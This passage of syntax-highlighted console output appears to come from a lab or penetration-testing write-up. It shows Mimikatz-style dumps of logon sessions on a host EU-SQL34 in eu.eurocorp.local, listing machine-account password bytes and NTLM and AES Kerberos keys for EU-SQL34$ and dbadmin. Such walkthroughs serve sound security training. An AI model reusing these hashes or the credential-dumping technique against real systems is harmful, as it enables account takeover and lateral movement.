class="literal">-sql34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : EU.EUROCORP.LOCAL</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">9</span>da664ef8d6659d982234c37bb86a444a2e7477b9a40374b911d7c40d16fd104</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">1049977</span> (<span class="number">00000000</span>:<span class="number">00100579</span>)</span><br><span class="line">Session           : Interactive from <span class="number">2</span></span><br><span class="line">User Name         : UMFD<span class="literal">-2</span></span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">44</span>:<span class="number">35</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-96-0-2</span></span><br><span class="line"></span><br><span class="line">         * Username : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : eu.eurocorp.local</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">951</span>f38603d66175dfc8ea566538aa772ce9529065ddb3f851529a016ea4f84c8</span><br><span class="line">           aes128_hmac       <span class="number">192</span>aab74e2f59c1a429c4c472d41a13a</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">201781</span> (<span class="number">00000000</span>:<span class="number">00031435</span>)</span><br><span class="line">Session           : Interactive from <span class="number">0</span></span><br><span class="line">User Name         : dbadmin</span><br><span class="line">Domain            : EU</span><br><span class="line">Logon Server      : EU<span class="literal">-DC</span></span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">19</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-21-3665721161-1121904292-1901483061-1105</span></span><br><span class="line"></span><br><span class="line">         * Username : dbadmin</span><br><span class="line">         * Domain   : EU.EUROCORP.LOCAL</span><br><span class="line">         * Password : (null)</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</span><br><span class="line">           rc4_hmac_nt       <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_old      <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_md4           <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_nt_exp   <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line">           rc4_hmac_old_exp  <span class="number">0553</span>b02b95f64f7a3c27b9029d105c27</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">55826</span> (<span class="number">00000000</span>:<span class="number">0000</span>da12)</span><br><span class="line">Session           : Service from <span class="number">0</span></span><br><span class="line">User Name         : SQLTELEMETRY</span><br><span class="line">Domain            : NT Service</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">05</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775</span></span><br><span class="line"></span><br><span class="line">         * Username : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : eu.eurocorp.local</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">951</span>f38603d66175dfc8ea566538aa772ce9529065ddb3f851529a016ea4f84c8</span><br><span class="line">           aes128_hmac       <span class="number">192</span>aab74e2f59c1a429c4c472d41a13a</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">21040</span> (<span class="number">00000000</span>:<span class="number">00005230</span>)</span><br><span class="line">Session           : Interactive from <span class="number">0</span></span><br><span class="line">User Name         : UMFD<span class="literal">-0</span></span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">01</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-96-0-0</span></span><br><span class="line"></span><br><span class="line">         * Username : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : eu.eurocorp.local</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">951</span>f38603d66175dfc8ea566538aa772ce9529065ddb3f851529a016ea4f84c8</span><br><span class="line">           aes128_hmac       <span class="number">192</span>aab74e2f59c1a429c4c472d41a13a</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">21012</span> (<span class="number">00000000</span>:<span class="number">00005214</span>)</span><br><span class="line">Session           : Interactive from <span class="number">1</span></span><br><span class="line">User Name         : UMFD<span class="literal">-1</span></span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">01</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-96-0-1</span></span><br><span class="line"></span><br><span class="line">         * Username : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : eu.eurocorp.local</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">951</span>f38603d66175dfc8ea566538aa772ce9529065ddb3f851529a016ea4f84c8</span><br><span class="line">           aes128_hmac       <span class="number">192</span>aab74e2f59c1a429c4c472d41a13a</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">999</span> (<span class="number">00000000</span>:<span class="number">000003</span>e7)</span><br><span class="line">Session           : UndefinedLogonType from <span class="number">0</span></span><br><span class="line">User Name         : EU<span class="literal">-SQL34</span><span class="variable">$</span></span><br><span class="line">Domain            : EU</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : <span class="number">1</span>/<span class="number">17</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">01</span> AM</span><br><span class="line">SID               : S<span class="literal">-1-5-18</span></span><br><span class="line"></span><br><span class="line">         * Username : eu<span class="literal">-sql34</span><span class="variable">$</span></span><br><span class="line">         * Domain   : EU.EUROCORP.LOCAL</span><br><span class="line">         * Password : <span class="number">29</span> e0 <span class="number">3</span>b db <span class="number">75</span> <span class="number">52</span> <span class="number">1</span>b c2 <span class="number">2</span>c <span class="number">0</span>f fe da <span class="number">8</span>c <span class="built_in">fc</span> <span class="number">85</span> a1 d0 ed <span class="number">4</span>c <span class="number">5</span>a <span class="number">3</span>e b8 <span class="number">23</span> <span class="number">63</span> f2 dc df <span class="number">04</span> <span class="number">88</span> e0 d5 <span class="number">5</span>b <span class="number">0</span>c <span class="number">07</span> fd d6 <span class="number">71</span> <span class="number">5</span>b <span class="number">80</span> <span class="number">82</span> <span class="number">4</span>d <span class="number">0</span>b <span class="number">7</span>d <span class="number">33</span> <span class="number">4</span>e e2 f0 c1 <span class="number">9</span>c <span class="number">92</span> <span class="number">97</span> <span class="number">3</span>b <span class="number">97</span> <span class="number">55</span> <span class="number">6</span>b ea <span class="number">74</span> <span class="number">76</span> <span class="number">34</span> <span class="number">54</span> <span class="number">63</span> <span class="number">83</span> a5 <span class="number">8</span>a e5 <span class="number">30</span> dd <span class="number">85</span> ad <span class="number">62</span> <span class="number">5</span>a <span class="number">4</span>f <span class="number">34</span> <span class="number">06</span> <span class="number">44</span> d9 f3 <span class="number">08</span> b8 <span class="number">07</span> <span class="number">2</span>f ee e2 d0 <span class="number">10</span> <span class="number">25</span> cc f0 <span class="number">70</span> e6 b6 <span class="number">8</span>c <span class="number">4</span>c <span class="number">96</span> <span class="number">2</span>a <span class="number">74</span> e1 <span class="built_in">fc</span> <span class="number">04</span> d8 f5 <span class="number">06</span> <span class="number">16</span> da <span class="number">0</span>d <span class="number">1</span>e <span class="number">21</span> <span class="number">0</span>f <span class="number">8</span>c cf c8 d2 <span class="number">90</span> <span class="number">32</span> <span class="number">09</span> <span class="number">8</span>f <span class="number">65</span> <span class="number">0</span>b <span class="number">4</span>b <span class="number">45</span> <span class="number">1</span>c <span class="number">78</span> <span class="number">7</span>f <span class="number">61</span> f3 <span class="number">6</span>b f8 <span class="number">57</span> <span class="number">6</span>e f3 d7 <span class="built_in">fc</span> d3 ed <span class="number">45</span> bc <span class="number">3</span>b <span class="number">00</span> f8 <span class="number">38</span> <span class="number">3</span>a <span class="number">62</span> <span class="number">53</span> <span class="number">5</span>b c3 <span class="number">45</span> <span class="number">7</span>d <span class="number">41</span> f1 <span class="number">13</span> cf <span class="number">23</span> bb <span class="number">5</span>e ae <span class="number">73</span> <span class="number">3</span>f ea b7 <span class="number">79</span> <span class="number">1</span>c b3 e6 d4 <span 